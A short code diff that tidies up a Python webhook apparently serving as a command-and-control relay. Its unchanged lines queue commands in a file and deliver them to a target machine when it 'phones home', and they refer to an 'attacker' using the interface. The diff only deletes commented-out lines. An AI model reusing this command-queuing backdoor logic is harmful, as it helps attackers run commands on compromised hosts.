@@ -27,7 +27,6 @@ def webhook():
        file=open(filecmd, "r")
 # Loop through here, sending one command at a time getting output back.
        cmd=file.read()
-#       count=0
        data['text']=cmd
        js=json.dumps(data)
        log('Sent {}'.format(data))
@@ -35,7 +34,6 @@ def webhook():
        open('commands.txt', 'w').close()
        resp=Response(js, status=200, mimetype='application/json')
        return resp
-#       exit()
 
 # Display the help page if attacker types 'help'
     if data['text'] == 'help':
@@ -48,7 +46,6 @@ def webhook():
        filename='commands.txt'
        file=open(filename, "a+")
        file.write(cmd + ',')
-#       file.write('\n')
        file.close()
        msg='Executing Command when target phones home next: '
        msg=msg+cmd
@@ -68,4 +65,3 @@ def send_message(msg):
 def log(msg):
   print(str(msg))
   sys.stdout.flush()
-
